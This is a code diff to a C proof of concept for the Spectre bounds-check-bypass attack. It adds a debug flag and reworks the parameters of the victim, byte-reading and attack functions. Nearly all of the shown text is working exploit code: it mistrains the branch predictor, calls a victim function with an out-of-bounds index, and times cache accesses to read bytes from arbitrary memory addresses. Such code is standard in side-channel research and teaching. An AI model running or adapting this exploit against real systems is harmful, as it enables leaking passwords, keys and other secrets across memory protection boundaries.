@@ -12,14 +12,16 @@ uint8_t array2[256 * 512];
 
 const int cache_hit_threshold = 100;
 
-void victim_function(const size_t x) {
-    // printf("Victim function called with x=%zu\n", x);
+void victim_function(const size_t x, bool debug) {
+    if (debug) {
+        printf("Victim function called with x=%zu\n", x);
+    }
     if (x < array1_size) {
         uint8_t temp = array2[array1[x] * 512];
     }
 }
 
-bool readMemoryByte(const int cache_hit_threshold, const size_t malicious_x, uint8_t *value, int *score) {
+bool readMemoryByte(const int cache_hit_threshold, const size_t malicious_x, uint8_t *value, int *score, bool debug) {
     static int results[256];
     int j = -1, k = -1;
     unsigned int junk = 0;
@@ -49,7 +51,7 @@ bool readMemoryByte(const int cache_hit_threshold, const size_t malicious_x, uin
             x = training_x ^ x & (malicious_x ^ training_x);
 
             /* Call the victim! */
-            victim_function(x);
+            victim_function(x, debug);
         }
 
         /* Time reads. Order is lightly mixed up to prevent stride prediction */
@@ -91,7 +93,7 @@ bool readMemoryByte(const int cache_hit_threshold, const size_t malicious_x, uin
 }
 
 
-bool read_target(int len, size_t malicious_x, const int cache_hit_threshold, char *output) {
+bool read_target(int len, size_t malicious_x, int cache_hit_threshold, char *output, bool debug) {
     for (int i = 0; i < (int) sizeof(array2); i++) {
         /* write to array2 so in RAM not copy-on-write zero pages */
         array2[i] = 1;
@@ -103,7 +105,7 @@ bool read_target(int len, size_t malicious_x, const int cache_hit_threshold, cha
         int score;
         printf("Reading at %p: ", (void *) malicious_x);
 
-        const bool success = readMemoryByte(cache_hit_threshold, malicious_x, &value, &score);
+        const bool success = readMemoryByte(cache_hit_threshold, malicious_x, &value, &score, debug);
 
         printf("%s: ", success ? "Success" : "Unclear");
         printf("0x%02X='%c' score=%d", value, value > 31 && value < 127 ? value : '?', score);
@@ -121,14 +123,10 @@ bool read_target(int len, size_t malicious_x, const int cache_hit_threshold, cha
     return true;
 }
 
-int len = 120;
-
-int attack(const char *test) {
-    char output[len];
-
+int attack(char *test, int len, char *output, bool debug) {
     const size_t malicious_x = test - (char *) array1;
 
-    if (read_target(len, malicious_x, cache_hit_threshold, output)) {
+    if (read_target(len, malicious_x, cache_hit_threshold, output, debug)) {
         printf("Read succeeded: %s\n", output);
         return 0;
     }
